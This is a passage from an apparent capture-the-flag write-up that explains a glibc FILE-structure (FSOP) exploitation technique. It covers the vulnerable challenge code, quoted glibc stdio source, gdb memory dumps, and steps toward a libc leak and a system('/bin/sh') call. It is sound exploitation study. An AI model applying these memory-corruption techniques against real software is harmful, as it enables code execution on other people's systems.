class="line"></span><br><span class="line"><span class="keyword">if</span>(!(fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line">write_str(<span class="string">&quot;Open error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fp-&gt;_wide_data = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line"><span class="keyword">switch</span>(menu())&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fflush(fp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ofs;</span><br><span class="line">write_str(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((ofs = getint()) &amp; <span class="number">0x80</span>)</span><br><span class="line">ofs |= <span class="number">0x40</span>;</span><br><span class="line">write_str(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">((<span class="type">char</span>*)fp)[ofs] = getint();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">write_str(<span class="string">&quot;Done.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">write_str(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">write_str(<span class="string">&quot;\nMENU\n&quot;</span></span><br><span class="line"><span class="string">&quot;1. Flush\n&quot;</span></span><br><span class="line"><span class="string">&quot;2. Trick\n&quot;</span></span><br><span class="line"><span class="string">&quot;0. Exit\n&quot;</span></span><br><span class="line"><span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getint();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getnline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(size &lt;= <span class="number">0</span> || (len = read(STDIN_FILENO, buf, size<span class="number">-1</span>)) &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(buf[len<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">len--;</span><br><span class="line">buf[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getint</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">getnline(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Exploitation-ideas"><a href="#Exploitation-ideas" class="headerlink" title="Exploitation ideas"></a>Exploitation ideas</h1><p>I tried (in this order) to:</p><ul><li>Get a libc leak by calling <code>_IO_file_underflow</code> to make input and output buffers equal to the base buffer that contains with the help of <code>_IO_file_doallocate</code> a heap address. And then flushing the file stream to leak the libc. </li><li>Get a heap leak by leaking a heap pointer stored within the <code>main_arena</code>. </li><li>Get an arbitrary write with a tcache dup technique, I got <code>__free_hook</code> as the last pointer available in the target tcache bin but I didn’t succeeded to get a shell &gt;.&lt;.</li><li>Call primitive with control over the first argument by calling <code>_IO_obstack_overflow</code> (part of the <code>_IO_obstack_jumps</code> vtable). Then it allows us to call <code>system(&quot;/bin/sh\x00&quot;)</code>.</li></ul><h2 id="Libc-leak"><a href="#Libc-leak" class="headerlink" title="Libc leak"></a>Libc leak</h2><p>To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we’re looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable in such a way that <code>fp-&gt;vtable-&gt;sync()</code> calls <code>_IO_default_doallocate</code>. Then <code>_IO_default_doallocate</code> is called and does some operations:</p><p>The initial state of the file stream looks like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x559c0955e2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0</span><br><span class="line">0x559c0955e310: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x559c0955e320: 0x0000000000000000      0x0000559c0955e380</span><br><span class="line">0x559c0955e330: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x559c0955e340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8</span><br><span class="line">0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580</span><br></pre></td></tr></table></figure><p>It initializes the base buffer to a fresh <code>BUFSIZE</code> allocated buffer.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line"></span><br><span class="line">  buf = <span class="built_in">malloc</span>(BUFSIZ);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (buf == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, buf, buf+BUFSIZ, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x559c0955e2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2d0: 0x0000000000000000      0x0000559c0955e480</span><br><span class="line">0x559c0955e2e0: 0x0000559c09560480      0x0000000000000000</span><br><span class="line">0x559c0955e2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0</span><br><span class="line">0x559c0955e310: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x559c0955e320: 0x0000000000000000      0x0000559c0955e380</span><br><span class="line">0x559c0955e330: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x559c0955e340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8</span><br><span class="line">0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580</span><br></pre></td></tr></table></figure><p>Once we have a valid pointer into the base buffer, we try to get into both the input and output buffer the base pointer.<br>Given the input &#x2F; output buffer are <code>NULL</code> and that <code>fp-&gt;flags</code> is <code>0xfbad1800 | 0x8000</code> (plus <code>0x8000</code> &#x3D;&gt; <code>_IO_USER_LOCK</code> to not stuck into <code>fflush</code>), we do not have issues with the checks. The issue with the <code>_IO_SYSREAD</code> call is described in the code below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Given the vtable is misaligned, _IO_SYSREAD will call </span></span><br><span class="line"><span class="comment">  _IO_default_pbackfail, the code is given after _IO_new_file_underflow */</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_pbackfail (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; !_IO_in_backup (fp)</span><br><span class="line">      &amp;&amp; (<span class="type">unsigned</span> <span class="type">char</span>) fp-&gt;_IO_read_ptr[<span class="number">-1</span>] == c)</span><br><span class="line">    --fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span></span><br><span class="line">      <span class="keyword">if</span> (!_IO_in_backup (fp))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We need to keep the invariant that the main get area</span></span><br><span class="line"><span class="comment">     logically follows the backup area.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; _IO_have_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_ptr))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!_IO_have_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// !! We should take this path cuz there is no save buffer plus we do not have the backup flag</span></span><br><span class="line">      <span class="comment">/* No backup buffer: allocate one. */</span></span><br><span class="line">      <span class="comment">/* Use nshort buffer, if unused? (probably not)  FIXME */</span></span><br><span class="line">      <span class="type">int</span> backup_size = <span class="number">128</span>;</span><br><span class="line">      <span class="type">char</span> *bbuf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (backup_size);</span><br><span class="line">      <span class="keyword">if</span> (bbuf == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      fp-&gt;_IO_save_base = bbuf;</span><br><span class="line">      fp-&gt;_IO_save_end = fp-&gt;_IO_save_base + backup_size;</span><br><span class="line">      fp-&gt;_IO_backup_base = fp-&gt;_IO_save_end;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_switch_to_backup_area (fp);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt;= fp-&gt;_IO_read_base)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Increase size of existing backup buffer. */</span></span><br><span class="line">  <span class="type">size_t</span> new_size;</span><br><span class="line">  <span class="type">size_t</span> old_size = fp-&gt;_IO_read_end - fp-&gt;_IO_read_base;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  new_size = <span class="number">2</span> * old_size;</span><br><span class="line">  new_buf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="built_in">memcpy</span> (new_buf + (new_size - old_size), fp-&gt;_IO_read_base,</span><br><span class="line">  old_size);</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_read_base);</span><br><span class="line">  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),</span><br><span class="line">    new_buf + new_size);</span><br><span class="line">  fp-&gt;_IO_backup_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *--fp-&gt;_IO_read_ptr = c;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_pbackfail)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x559c0955e2a0: 0x00000000fbad2588      0x0000559c0956050f</span><br><span class="line">0x559c0955e2b0: 0x0000559c09560590      0x0000559c09560490</span><br><span class="line">0x559c0955e2c0: 0x0000559c0955e480      0x0000559c0955e480</span><br><span class="line">0x559c0955e2d0: 0x0000559c0955e480      0x0000559c0955e480</span><br><span class="line">0x559c0955e2e0: 0x0000559c09560480      0x0000559c0955e480</span><br><span class="line">0x559c0955e2f0: 0x0000559c09560510      0x0000559c0955e480</span><br><span class="line">0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0</span><br><span class="line">0x559c0955e310: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x559c0955e320: 0x0000000000000000      0x0000559c0955e380</span><br><span class="line">0x559c0955e330: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x559c0955e340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e370: 0x0000000000000000      0x00007f99db7bc460</span><br><span class="line">0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580</span><br></pre></td></tr></table></figure><p>Once we have the pointers at the right place, we can simply do some partial overwrites to the portion of the heap that contains a libc pointer. Indeed by taking a look at the memory at <code>fp-&gt;_IO_base_buffer &amp; ~0xff</code> (to avoid 4 bits bruteforce) we can that we can directly reach a libc pointer:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x5649e8077400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077420: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077460: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077470: 0x00007f4092dc3f60      0x0000000000002011</span><br><span class="line">0x5649e8077480: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077490: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>Then we have to actually doing the partial overwrite by corrupting certain pointers to leak this address with the help of <code>_IO_fflush</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fflush)</span><br></pre></td></tr></table></figure><p>It ends up calling <code>_IO_new_file_sync(fp)</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><p>I already talked about the way we can gain arbitrary read with FSOP attack on <code>stdout</code> in <a href="../catastrophe">this article</a>. The way we will get a leak is almost the same, first we need to trigger the first condition in <code>_IO_new_file_sync</code> in such a way that <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> will trigger <code>_IO_do_flush(fp)</code>. Then <code>_IO_do_flush</code> triggers the classic code path I dump right below. I will not comment all of it, the only thing you have to remind is that given most of the buffers are already initialized to a valid heap address beyond the target we do not have to rewrite them, this way we will significantly reduce the amount of partial overwrite.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 